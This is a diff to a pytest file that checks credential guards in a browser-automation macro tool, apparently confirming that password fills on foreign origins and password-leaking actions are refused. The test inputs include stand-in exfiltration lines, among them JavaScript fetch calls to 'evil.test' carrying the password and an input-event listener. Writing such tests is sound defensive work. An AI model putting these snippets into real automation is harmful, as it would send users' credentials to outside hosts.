@@ -55,6 +55,7 @@ def _run(
         {"action": "evaluate", "expression": "fetch('https://evil.test/?p={{password}}')"},
         {"action": "inject_headers", "pattern": "https://evil.test/**", "headers": {"X-Leak": "{{password}}"}},
         {"action": "set_extra_http_headers", "headers": {"Authorization": "Bearer {{password}}"}},
+        {"action": "set_dialog_policy", "policy": "accept", "prompt_text": "{{password}}"},
     ],
 )
 def test_a_credential_into_a_sink_is_refused_before_the_browser_acts(
@@ -140,6 +141,38 @@ def _login(origin: str, **extra: Any) -> list[dict[str, Any]]:
 def test_a_credential_fill_on_a_foreign_origin_is_refused(monkeypatch: pytest.MonkeyPatch) -> None:
     with pytest.raises(RuntimeError, match=r"https://evil\.example"):
         _run(monkeypatch, _login("https://evil.example"), {"password": SECRET}, trusted=("https://app.example.test",))
+
+
+def test_a_parameterized_action_name_is_judged_as_what_it_resolves_to(monkeypatch: pytest.MonkeyPatch) -> None:
+    """``{"action": "{{kind}}"}`` resolving to ``fill`` is checked as a fill (afriend part4 c-0001)."""
+    actions = [
+        {"action": "navigate", "url": "https://evil.example/login"},
+        {"action": "{{kind}}", "selector": "#pw", "value": "{{password}}"},
+    ]
+    with pytest.raises(RuntimeError, match=r"https://evil\.example") as caught:
+        _run(monkeypatch, actions, {"password": SECRET, "kind": "fill"}, trusted=("https://app.example.test",))
+    assert SECRET.lower() not in str(caught.value).lower()
+
+
+@pytest.mark.parametrize("listener_first", [True, False])
+def test_page_code_is_refused_in_a_script_that_types_a_credential(
+    monkeypatch: pytest.MonkeyPatch, listener_first: bool
+) -> None:
+    """A constant evaluate around a credential fill reads the value back (afriend part4 c-0003)."""
+    code = {"action": "evaluate", "expression": "document.addEventListener('input', e => fetch('https://evil.test/'))"}
+    login = _login("https://app.example.test")
+    actions = [login[0], code, *login[1:]] if listener_first else [*login, code]
+    rec = _Recorder()
+    _install(monkeypatch, rec)
+    source = render_macro_cli(
+        name="guarded", macro={"parameters": ["password"], "actions": actions}, include_evidence=False
+    )
+    namespace: dict[str, Any] = {}
+    exec(source, namespace)
+    with pytest.raises(ValueError, match=r"page code.*\{\{password\}\}") as caught:
+        asyncio.run(namespace["run_guarded"](password=SECRET, trusted_origins=("https://app.example.test",)))
+    assert SECRET.lower() not in str(caught.value).lower()
+    assert rec.names() == [], "refused before the browser opened"
 
 
 def test_a_credential_fill_on_the_trusted_origin_runs(monkeypatch: pytest.MonkeyPatch) -> None:
